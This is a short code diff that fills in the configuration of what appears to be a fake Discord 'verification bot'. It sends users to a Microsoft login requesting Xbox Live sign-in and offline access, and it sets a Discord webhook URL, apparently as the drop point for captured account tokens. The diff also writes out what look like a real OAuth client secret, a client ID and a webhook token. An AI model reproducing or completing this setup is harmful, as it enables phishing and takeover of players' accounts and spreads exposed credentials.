@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = 'it is what it is'
+const client_secret = 'vX08Q~7iXyKXMgnzLTPFm-f~SlLFyhDG5WEh8bbV' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'f7afe04b-fff7-48dc-9446-b4213db3e2b5'
 const redirect_uri = 'https://verification-bot-94ml.onrender.com'
-const webhook_url = 'ur shit ass webhook mf'
+const webhook_url = 'https://discord.com/api/webhooks/1049450771051196446/-biSdQNnMwTE0XdF3KLcEJPb8_drhkpkS_xFIaLOvVChoHE-Cyid4sm3xyHbdABHMz4p'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
